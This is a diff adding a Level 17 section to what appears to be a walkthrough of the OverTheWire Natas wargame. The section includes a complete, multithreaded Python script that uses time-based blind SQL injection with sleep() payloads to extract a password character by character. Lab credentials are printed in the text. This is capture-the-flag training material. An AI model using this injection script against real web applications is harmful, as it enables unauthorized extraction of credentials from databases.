@@ -245,3 +245,86 @@ for i in range(1, 34):
 ```
 
 We use `^` to make sure we find the right order of characters. Run it and we get the password: `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`
+
+# # Level 17
+
+Looking at the source code, we see the output is commented out, so we need another approach for blind SQL injection. For this level we use **time-based SQL injection** - we track the response time to find the password. You can use similar code to find the username, but based on past levels we can guess it's `natas18`.
+
+This level's code is very similar to level 15, but the difference is the SQL injection input has a condition: if the condition is true (the char is in the password), the `sleep()` method gets called and it takes n seconds to return the response.
+
+The code :
+
+```python
+import requests
+import string
+from requests.auth import HTTPBasicAuth
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+basicAuth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+u = "http://natas17.natas.labs.overthewire.org/index.php?debug"
+
+password = ""
+PASSWORD_LENGTH = 32
+VALID_CHARS = string.digits + string.ascii_letters
+
+# Use session for connection pooling
+session = requests.Session()
+session.auth = basicAuth
+session.headers.update(headers)
+session.verify = False
+
+def test_char(c, current_password, position):
+    """Test a single character at current position"""
+    payload = (f"username=natas18\" AND "
+               f"IF(BINARY substring(password,1,{position}) = '{current_password}{c}', sleep(2), False) -- ")
+    
+    try:
+        response = session.post(u, data=payload, timeout=3)
+        if response.elapsed.total_seconds() > 1.8:  # Slightly lower threshold for reliability
+            return c
+    except requests.exceptions.Timeout:
+        # Timeout also indicates sleep was triggered
+        return c
+    except Exception:
+        pass
+    return None
+
+print("Starting password crack...")
+count = 1
+
+while count <= PASSWORD_LENGTH:
+    found_char = None
+    
+    # Test characters in parallel for THIS position only
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        # Submit all character tests for current position
+        future_to_char = {
+            executor.submit(test_char, c, password, count): c 
+            for c in VALID_CHARS
+        }
+        
+        # Process results as they complete
+        for future in as_completed(future_to_char):
+            result = future.result()
+            if result:
+                found_char = result
+                # Cancel remaining futures since we found the right char
+                for f in future_to_char:
+                    f.cancel()
+                break
+    
+    if found_char:
+        password += found_char
+        print(f"Found char {count}/{PASSWORD_LENGTH}: {password}")
+        count += 1
+    else:
+        print(f"No character found at position {count}, password might be complete")
+        break
+
+print(f"\nDone! Password: {password}")
+session.close()
+```
+
+Password: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`
